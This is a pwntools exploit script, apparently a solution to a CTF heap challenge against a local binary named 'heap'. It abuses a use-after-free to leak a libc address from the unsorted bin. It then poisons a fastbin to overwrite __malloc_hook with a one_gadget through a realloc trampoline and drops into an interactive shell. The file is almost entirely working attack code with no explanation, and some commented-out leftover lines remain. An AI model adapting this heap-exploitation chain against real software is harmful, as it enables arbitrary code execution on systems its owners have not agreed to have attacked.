#!/usr/bin/python
#coding=utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','sh','-c']
context.binary = './heap'
p = process('./heap')
libc = ELF('./libc.so.6')
elf = ELF('./heap')
free_got = elf.got['free']
info(hex(free_got))
def add(size):
	p.sendlineafter('Input your choice: ','1')
	p.sendlineafter('Input the size of item: ',str(size))
def show(idx):
	p.sendlineafter('Input your choice: ','2')
	p.sendlineafter('Input the index of item: ',str(idx))
def edit(idx,payload):
	p.sendlineafter('Input your choice: ','3')
	p.sendlineafter('Input the index of item: ',str(idx))
	p.sendlineafter('Input the data: ',payload)
def delete(idx):
	p.sendlineafter('Input your choice: ','4')
	p.sendlineafter('Input the index of item: ',str(idx))

p.recvuntil("What's your name: ")
p.sendline('/bin/sh')
add(0x80)
add(0x60)
delete(0)
show(0)
p.recvuntil(': ')
unsorted = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
libc_base = unsorted-3951480
info(hex(libc_base))
free_hook = libc_base+0x3c67a8
malloc_hook = libc_base+0x3c4b10
realloc = libc_base+0x846c0
info(hex(realloc))
one = [0x45216,0x4526a,0xf0274,0xf1117]
one_gadget = libc_base+one[1]
info(hex(one_gadget))
delete(1)

edit(1,p64(malloc_hook-0x23))
# edit(1,p64(realloc_hook-0x1b))
# edit(1,p64(-0x13))

add(0x60)

add(0x60)
edit(3,'\x00'*(0x1b-0x10)+p64(one_gadget)+p64(realloc+12))
# gdb.attach(p)
add(0x66)
# payload = 
# edit(1,payload)
# add(0x10)
# add(0x10)
# payload = 
# edit(3,payload)
# delet(3)

p.interactive()
